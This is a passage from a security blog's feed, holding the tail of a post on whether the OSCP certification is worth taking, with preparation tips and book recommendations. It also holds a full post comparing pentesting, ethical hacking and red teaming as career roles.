Buying one round of training is a hard requirement to sit the exam. So if you want value for money just sign up, a resit costs a fraction of the price and you’ll know what to expect next time. If you pass first time… great!&lt;/p&gt;

&lt;h2 id=&quot;will-oscp-get-me-a-job&quot;&gt;Will OSCP get me a job?&lt;/h2&gt;

&lt;p&gt;No, OSCP is great to have on your CV but you get yourself a job. It’s my experience that in technology, certifications and education show that you can learn how to do something and will help get you through HR requirements but ultimately individual’s make themselves employable. OSCP may get you noticed, but you need to deliver on attitude.&lt;/p&gt;

&lt;h2 id=&quot;what-should-i-do-to-prepare&quot;&gt;What Should I do to Prepare?&lt;/h2&gt;

&lt;p&gt;From the website, all students are required to have:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Solid understanding of TCP/IP networking&lt;/li&gt;
  &lt;li&gt;Reasonable Windows and Linux administration experience&lt;/li&gt;
  &lt;li&gt;Familiarity of Bash scripting with basic Python or Perl a plus&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;And to be fair, if you can commit to the lab time then that is enough. If you want more preparation the free &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/&quot;&gt;Metasploit Unleashed Course&lt;/a&gt; course gives you a good grounding. Platforms like &lt;a href=&quot;https://tryhackme.com/&quot;&gt;Try Hack Me&lt;/a&gt; and &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack the Box&lt;/a&gt; offer a good way to practice and learn. Try Hack Me is a bit more beginner friendly than Hack the Box but both have great practice resources. The key thing to remember is that PWK (and OSCP) offers a training opportunity, so to get the most out of it you need to be prepared to learn.&lt;/p&gt;

&lt;p&gt;The OSCP certification is notorious for being really difficult and many people fall a foul of the fear of failure here. As a result they over-prepare and don’t really get the full value of the PWK training. Check the course pre-requisites, if you think you are close to them you are good to go.&lt;/p&gt;

&lt;p&gt;Worst case if you fail you will still have the PWK training resources, a grounding of the basics and experience of the exam. A re-sit is inexpensive relative to the initial outlay and you will be free to work on the areas you need to improve on to get the cert.&lt;/p&gt;

&lt;p&gt;There are of course other resources that specialize in different disciplines, but for most of the challenges in the course I’d recommend searching the web for appropriate techniques. Some folks like to book learn, ones that I found useful were:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.amazon.co.uk/gp/product/1593275641/ref=as_li_tl?ie=UTF8&amp;amp;camp=1634&amp;amp;creative=6738&amp;amp;creativeASIN=1593275641&amp;amp;linkCode=as2&amp;amp;tag=bovinehero-21&amp;amp;linkId=4bf1565c65d493fcf8a63cac421e43e2&quot;&gt;Penetration Testing: A Hands-On Introduction to Hacking&lt;/a&gt; - A little dated now but an excellent addition to your library if you want something to read before you start. It covers most of the basic techniques, but the lab examples are not easy to set up in a Windows 10 world.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.amazon.co.uk/gp/product/159327288X/ref=as_li_tl?ie=UTF8&amp;amp;camp=1634&amp;amp;creative=6738&amp;amp;creativeASIN=159327288X&amp;amp;linkCode=as2&amp;amp;tag=bovinehero-21&amp;amp;linkId=a22a8ca0e7ba93e0710dcd92666ed58c&quot;&gt;Metasploit: The Penetration Tester’s Guide&lt;/a&gt; - A lot of folks don’t like to use metasploit while training for OSCP, none the less it is an excellent tool for learning how the exploits work and worthwhile read to learn how the framework works.&lt;/li&gt;
  &lt;li&gt;Kali Linux Revealed – Mastering the Penetration Testing Distribution &lt;a href=&quot;https://www.kali.org/download-kali-linux-revealed-book/&quot;&gt;free Kali Linux Book&lt;/a&gt; - Free e-book and a worth reading, especially if you want to learn &lt;em&gt;how&lt;/em&gt; to manage and install Kali.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.amazon.co.uk/gp/product/0979958717/ref=as_li_tl?ie=UTF8&amp;amp;camp=1634&amp;amp;creative=6738&amp;amp;creativeASIN=0979958717&amp;amp;linkCode=as2&amp;amp;tag=bovinehero-21&amp;amp;linkId=2e755e3b8aad584ddbe0369ae70d1e4d&quot;&gt;Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security&lt;/a&gt; - Despite being written in 2011, this book still remains one of the most useful guides for nmap. Highly recommended.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Some folks recommend the &lt;a href=&quot;https://www.amazon.co.uk/gp/product/1980901759/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=bovinehero-21&amp;amp;creative=6738&amp;amp;linkCode=as2&amp;amp;creativeASIN=1980901759&amp;amp;linkId=cb6b2ad0c7fe92414987588356225d45&quot;&gt;Hacker Playbooks&lt;/a&gt;, the &lt;a href=&quot;https://www.amazon.co.uk/gp/product/1494295504/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=bovinehero-21&amp;amp;creative=6738&amp;amp;linkCode=as2&amp;amp;creativeASIN=1494295504&amp;amp;linkId=a3c2a24d7aad6e643c13208e7a378150&quot;&gt;RTFM&lt;/a&gt; and the &lt;a href=&quot;https://www.amazon.co.uk/gp/product/1118026470/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=bovinehero-21&amp;amp;creative=6738&amp;amp;linkCode=as2&amp;amp;creativeASIN=1118026470&amp;amp;linkId=6044f5d0496a62693004e5244ba610e0&quot;&gt;Web Application Hacker’s Handbook&lt;/a&gt;. All excellent resources but not really required for OSCP.&lt;/p&gt;

&lt;h2 id=&quot;how-hard-is-it&quot;&gt;How hard is it?&lt;/h2&gt;

&lt;p&gt;Meh! It is hard until it isn’t. It took me a year from starting to passing it. In the beginning it was very difficult, but at the time I had little knowledge of the resources available. These days there are many more tools available and a lot of the manual steps can be heavily automated. It is a foundation course, but not a beginner course. The right attitude and good time management will make it easier. Many folks offer ‘OSCP Cheat Sheets’ and ‘OSCP like boxes’, in truth the only real OSCP cheat sheet is the one you make for yourself on the course and the OSCP boxes… well they are the ones you sit on the exam.&lt;/p&gt;

&lt;h2 id=&quot;in-summary&quot;&gt;In Summary&lt;/h2&gt;

&lt;p&gt;Hopefully this post has given you a little insight into the OSCP certification and debunked some of the concerns you may have.&lt;/p&gt;

&lt;p&gt;While the course and the labs are both educational and fun, the real value of this certification (for me at least) is the learning experience. For that reason it’s my opinion that if you you want to do become OSCP and you think you meet the requirements, then sign up and take the course. I would add the caveat that if you are a beginner, plan to budget for 180 days and an additional resit.&lt;/p&gt;

&lt;p&gt;The first exam attempt and 90 days will give you a good measure of your abilities, if you need more independent study take the second 90 days (or less) and a resit after a break and a little while on other platforms. If you beat the labs and training in under 30 days, you didn’t need to take this course.&lt;/p&gt;</content><author><name></name></author><category term="Offsec" /><summary type="html">A couple of years ago I passed my Offensive Security Certified Professional (OSCP) certification. Often considered the certification to get in the pen-testing space it has a fearsome reputation for being very difficult. In this post I’m looking at debunking some of the myths.</summary></entry><entry><title type="html">Think like a Hacker</title><link href="http://localhost:4000/offsecmusings/Think-Like-a-Hacker.html" rel="alternate" type="text/html" title="Think like a Hacker" /><published>2020-04-10T00:00:00+01:00</published><updated>2020-04-10T00:00:00+01:00</updated><id>http://localhost:4000/offsecmusings/Think-Like-a-Hacker</id><content type="html" xml:base="http://localhost:4000/offsecmusings/Think-Like-a-Hacker.html">&lt;p&gt;Lots of different terms apply to the offensive side of security, collectively I refer to it as the Red side but what is the difference in the real world?&lt;/p&gt;

&lt;h2 id=&quot;the-different-types-of-hacker&quot;&gt;The Different Types of Hacker&lt;/h2&gt;

&lt;p&gt;A lot of people are drawn to the attacking side of security because it carries the mystique of elite and unknown skills.&lt;/p&gt;

&lt;p&gt;The reality of course is that this side of security is like any other, to be successful all you need is the right attitude and practice.&lt;/p&gt;

&lt;p&gt;There are 3 main types of hacking I’d like to look at:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pentesting&lt;/li&gt;
  &lt;li&gt;Ethical Hacking&lt;/li&gt;
  &lt;li&gt;Red Teaming&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It is important to realise that all 3 share a similar skill set, but Pentesting != Ethical Hacking != Red Teaming.&lt;/p&gt;

&lt;h3 id=&quot;pentester&quot;&gt;Pentester&lt;/h3&gt;

&lt;p&gt;Pentesting is the process of assessing cybersecurity risk for applications. Largley a repeatable and a standardised process, effective pentesting adds considerable value to an application if it is performed early on in the development cycle.&lt;/p&gt;

&lt;p&gt;The goal for the pentest is to discover and highlight as many issues as possible. The key metric for success is being able to methodically quantify cyber findings (issues) in order to measure risk.&lt;/p&gt;

&lt;p&gt;The key security skill for an effective pentester is vulnerability analysis. Being able to articulate how a vulnerability can be exploited and what the impact &lt;em&gt;could&lt;/em&gt; be is more preferable for the client than proving your l33t h4xx1ng sk1llz.&lt;/p&gt;

&lt;p&gt;When it comes down to it, pentesting is like any other testing role outside of security. The goal is to highlight issues for the developers to fix.&lt;/p&gt;

&lt;h3 id=&quot;ethical-hacker&quot;&gt;Ethical Hacker&lt;/h3&gt;

&lt;p&gt;Ethical Hacking is a comprehensive term which covers general attacks on a system. If pentesting is about finding the vulnerabilities then ethical hacking is about establishing the consequences of them.&lt;/p&gt;

&lt;p&gt;The goal of an ethical hacker is to show the impact an attack can have on a system and often requires demonstration of the techniques malicious actors would use.&lt;/p&gt;

&lt;p&gt;The Ethical Hacker needs to have a good understanding of technical paradigms and be able to adapt them to novel circumstances in order to exploit a system. Where a pentester needs a methodical mindset the ethical needs to focus on creativity, thus the goal of the ethical hacker is often exploit systems in a fashion that they were not designed to.&lt;/p&gt;

&lt;h3 id=&quot;red-team&quot;&gt;Red Team&lt;/h3&gt;

&lt;p&gt;The Red Team is a term born from US military doctrine and represents a simulated Opposing Force (OpFor) for the defending team (Blue side). The purpose of the Red Team is to act as an intelligent adversary against the system. When working as Red Team scope is typically larger, a building, a network or action on some other objective.&lt;/p&gt;

&lt;p&gt;The Red Team gives the organization a chance to practice incident response and fine tune it’s defences. Normally the Red Team is just that, a team of specialists each with specific situational skills. A technically focused team attacking a network will often have Networking, Web, Nix and Wintel specialisms within its ranks.&lt;/p&gt;

&lt;p&gt;Key for Red Team engagements is adaptability as the Red Team will not always have industry tools readily available. They will often need to ‘live off the land’ and apply guerrilla tactics in order to action their objectives.&lt;/p&gt;

&lt;h2 id=&quot;which-is-better&quot;&gt;Which is Better?&lt;/h2&gt;

&lt;p&gt;When asked this question most people are drawn to the ethical hacking and red teaming, but in reality they all add value in different ways. As a security professional you should not limit yourself to a single role. Yes as you gain more experience as a pentester you will be better equipped to perform ethical hacking and engage targets as part of a red team but being a successful individual in any of these disciplines requires dedication and practice.&lt;/p&gt;

&lt;p&gt;If I’m in the business of making software, pentester’s offer the best value for money as catching security issues early saves me money in the long term. 
On the other hand if I work in a high stakes complex environment that deals with secret information, employing Red Teams to test defenses offer a measure of insurance against malicious actors.&lt;/p&gt;

&lt;p&gt;For me Ethical Hackers are the individuals that meet the areas of grey between these two extremes.&lt;/p&gt;</content><author><name></name></author><category term="Offsec" /><summary type="html">Lots of different terms apply to the offensive side of security, collectively I refer to it as the Red side but what is the difference in the real world? The Different Types of Hacker A lot of people are drawn to the attacking side of security because it carries the mystique of elite and unknown skills. The reality of course is that this side of security is like any other, to be successful all you need is the right attitude and practice. There are 3 main types of hacking I’d like to look at: Pentesting Ethical Hacking Red Teaming It is important to realise that all 3 share a similar skill set, but Pentesting != Ethical Hacking != Red Teaming. Pentester Pentesting is the process of assessing cybersecurity risk for applications. Largley a repeatable and a standardised process, effective pentesting adds considerable value to an application if it is performed early on in the development cycle. The goal for the pentest is to discover and highlight as many issues as possible. The key metric for success is being able to methodically quantify cyber findings (issues) in order to measure risk. The key security skill for an effective pentester is vulnerability analysis. Being able to articulate how a vulnerability can be exploited and what the impact could be is more preferable for the client than proving your l33t h4xx1ng sk1llz. When it comes down to it, pentesting is like any other testing role outside of security. The goal is to highlight issues for the developers to fix. Ethical Hacker Ethical Hacking is a comprehensive term which covers general attacks on a system. If pentesting is about finding the vulnerabilities then ethical hacking is about establishing the consequences of them. The goal of an ethical hacker is to show the impact an attack can have on a system and often requires demonstration of the techniques malicious actors would use. The Ethical Hacker needs to have a good understanding of technical paradigms and be able to adapt them to novel circumstances in order to exploit a system. Where a pentester needs a methodical mindset the ethical needs to focus on creativity, thus the goal of the ethical hacker is often exploit systems in a fashion that they were not designed to. Red Team The Red Team is a term born from US military doctrine and represents a simulated Opposing Force (OpFor) for the defending team (Blue side). The purpose of the Red Team is to act as an intelligent adversary against the system. When working as Red Team scope is typically larger, a building, a network or action on some other objective. The Red Team gives the organization a chance to practice incident response and fine tune it’s defences. Normally the Red Team is just that, a team of specialists each with specific situational skills. A technically focused team attacking a network will often have Networking, Web, Nix and Wintel specialisms within its ranks. Key for Red Team engagements is adaptability as the Red Team will not always have industry tools readily available. They will often need to ‘live off the land’ and apply guerrilla tactics in order to action their objectives. Which is Better? When asked this question most people are drawn to the ethical hacking and red teaming, but in reality they all add value in different ways. As a security professional you should not limit yourself to a single role. Yes as you gain more experience as a pentester you will be better equipped to perform ethical hacking and engage targets as part of a red team but being a successful individual in any of these disciplines requires dedication and practice. If I’m in the business of making software, pentester’s offer the best value for money as catching security issues early saves me money in the long term. On the other hand if I work in a high stakes complex environment that deals with secret information, employing Red Teams to test defenses offer a measure of insurance against malicious actors. For me Ethical Hackers are the individuals that meet the areas of grey between these two extremes.</summary></entry></feed>